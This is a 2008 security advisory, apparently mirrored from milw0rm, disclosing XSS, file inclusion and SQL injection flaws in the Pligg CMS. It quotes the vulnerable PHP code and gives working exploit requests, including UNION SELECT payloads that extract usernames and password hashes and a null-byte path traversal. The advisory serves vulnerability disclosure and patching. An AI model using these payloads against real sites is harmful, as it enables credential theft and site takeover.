@@ -1,0 +1,186 @@
+##########################################################
+# GulfTech Security Research                July 30, 2008
+##########################################################
+# Vendor : Pligg LLC
+# URL : http://www.pligg.com/
+# Version : Pligg <= 9.9
+# Risk : Multiple Vulnerabilities
+##########################################################
+
+
+Description:
+Pligg is a popular open source, full featured, content management
+system written in php. There are a number of vulnerabilities
+within Pligg that allow for remote file enumeration, file inclusion,
+cross site scripting, and sql injection. When combined these issues
+allow for remote code execution on the affected installation
+via arbitrary php code placed within template files once admin
+credentials are gained via SQL Injection.
+
+
+
+Cross Site Scripting:
+There are Cross Site Scripting issues in Pligg that allow for
+theft of client side credentials such as cookies. An example
+can be found in user.php. If the "view" parameter is set to
+"search" then the "keyword" parameter can be influenced. This
+is a result of un sanitized GPC variables being issued directly
+to smarty via the assign function.
+
+/user.php?view=search&keyword=<script>alert(document.cookie);</script>
+
+The above example link would display the end users cookie to
+them. Of course this can also be used to steal the cookie data
+as mentioned earlier in this advisory.
+
+
+
+Arbitrary File Access:
+A number of file access issues exist in Pligg. They range from
+the not so severe (such as arbitrary file enumeration) to the
+much more severe (arbitrary file inclusion). In regards to the
+arbitrary file enumeration a good example of it can be found in
+trackback.php @ line 76
+
+$contents=@file_get_contents($tb_url);
+if(!$contents)
+trackback_response(1, $main_smarty->get_config_vars('PLIGG_Visual_Trackback_BadURL'));
+
+The $tb_url variable gets it's value directly from a post variable
+as seen @ line 36, so, we can see how this can be easily used to
+enumerate the existence of files on the web server both inside and
+outside of the web accessible directories. If the file exists we will
+get the "PLIGG_Visual_Trackback_BadURL" error. In addition to this
+issue, an attacker may also include arbitrary files via a malformed
+template request. Both template and language data within Pligg are
+accepted via cookie input and are used in file handling operations
+with no sanitation. The vulnerable code in question can be found in
+config.php @ lines 65-68.
+
+/settemplate.php?template=../LICENSE.txt%00
+
+An easy way to see this issue in action is to set the malformed
+"template" value via Pligg's settemplate.php script as seen above.
+The above example will successfully include the LICENSE.txt file
+that ships with the application by default.
+
+
+
+SQL Injection:
+There are a substantial number of SQL Injection issues within Pligg
+that allow for an attacker to read any data from the underlying
+database including user credentials. The first file we are going to
+look at is vote.php
+
+$link = new Link;
+$link->id=$_POST['id'];
+$link->read_basic();
+
+The above code can be found @ lines 19-21 and shows Pligg setting the
+internal class variable "id" with data from the $_POST super global.
+Now let's have a look at the read_basic() function within the Link
+class to see what exactly is being done with "id"
+
+
+// check to see if the link is cached
+// if it is, use it
+// if not, get from mysql and save to cache
+
+if (isset($cached_links[$id]) && $usecache == TRUE) {
+    $link = $cached_links[$id];
+} else {
+    $link = $db->get_row("SELECT " . table_links . ".* FROM " .
+    table_links . " WHERE link_id = $id");
+    $cached_links[$id] = $link;
+}
+
+
+As you can see in the above code taken from /libs/link.php @ lines
+200-209 the "id" variable is never sanitized before being used in a
+query. The result is a highly exploitable SQL Injection vulnerability.
+
+md5=d41d8cd98f00b204e9800998ecf8427e&id=-99 UNION SELECT 1,2,3,null,5,
+6,concat(user_login,char(58),user_pass),8,9 FROM pligg_users -- /*
+
+By sending a post request to vote.php with the above data an attacker
+can successfully expose user credentials. Still, there are more SQL
+Injection issues in Pligg, and next we will have a look at trackback.php
+
+$trackres = new Trackback;
+$trackres->link=$tb_id;
+$trackres->type='in';
+$trackres->url = $tb_url;
+$dupe = $trackres->read();
+
+The above code comes from trackback.php @ lines 68-72, and like the
+issue we previously discussed in regards to vote.php also sends
+unsanitized gpc data to an internal class variable (in this case
+$trackres->link) where it is used in an SQL Query without ever being
+sanitized.
+
+/trackback.php?id=007 UNION SELECT 1,2,3,4,5,6,7,8,9,10 FROM pligg_users
+WHERE user_id=1 AND MID(user_pass,1,1)=concat(char(97)) -- /*
+
+A request like the one above made with the post method to trackback.php
+and having the post contents of "url=1&title=1&blog_name=1" can be used
+to successfully enumerate database contents. In the example above Pligg
+would return a "We already have a ping from that URL for this post."
+error if the first character of the first user's password is "a". Next
+let's have a look at submit.php @ lines 320-321 and you will see another
+SQL Injection issue very similar to these first two that I have discussed.
+Another SQL Injection issue can be found in story.php @ lines 45 where
+the "requestTitle" variable is used in a query with no sanitation.
+Another SQL Injection issue can be found in recommend.php @ lines 19-25.
+The SQL Injection issues in recommend.php are possible through both the
+"requestID" and the "requestTitle" variables. Another SQL Injection issue
+can be found in cloud.php @ lines 35-36 via the categoryID parameter.
+Another SQL Injection issue can be found within out.php and is not much
+different from the previously discussed SQL Injection issues in Pligg.
+
+/out.php?title=-99%27 UNION SELECT 1 FROM pligg_users WHERE user_id=1 AND
+MID(user_pass,1,1)=concat(char(97))/*
+
+The above url will allow an attacker to enumerate database data as
+discussed earlier, and eventually gain admin credentials. Due to the large
+number of SQL Injection issues in Pligg I will identify the remaining
+issues with some simple examples of exploitation.
+
+---[ login.php ]------------------------------------------------
+/* Post Request */
+processlogin=3&username=-99' UNION SELECT 1,2,3,4,5,6,null,8,9,10,11,12,13,14,
+15,16,17,18,19,20,21,22,23,24,25,26 FROM pligg_users WHERE user_id=1/*
+
+/* Get Request */
+/login.php?processlogin=4&username=-99' UNION SELECT 1 FROM pligg_users
+WHERE user_id=1/*&confirmationcode=1
+
+---[ cvote.php ]------------------------------------------------
+/* Post Request */
+id=-99 UNION SELECT 1,null,3,4,5,6,7,8,9 FROM pligg_users/*
+&md5=d41d8cd98f00b204e9800998ecf8427e
+
+---[ edit.php ]-------------------------------------------------
+/* Get Request */
+/edit.php?id=1&commentid=-99 UNION SELECT 1 FROM pligg_users WHERE
+user_id=1 AND MID(user_pass,1,1)=concat(char(49))/*
+
+
+
+Solution:
+The Pligg developers are aware of the issues mentioned in this advisory
+and an updated version of Pligg should be available from their website.
+All users are encouraged to upgrade their Pligg installations as soon
+as possible.
+
+
+
+Credits:
+James Bercegay of the GulfTech Security Research Team
+
+
+
+Related Info:
+The original advisory can be found at the following location
+http://www.gulftech.org/?node=research&article_id=00120-07312008
+
+# milw0rm.com [2008-07-30]
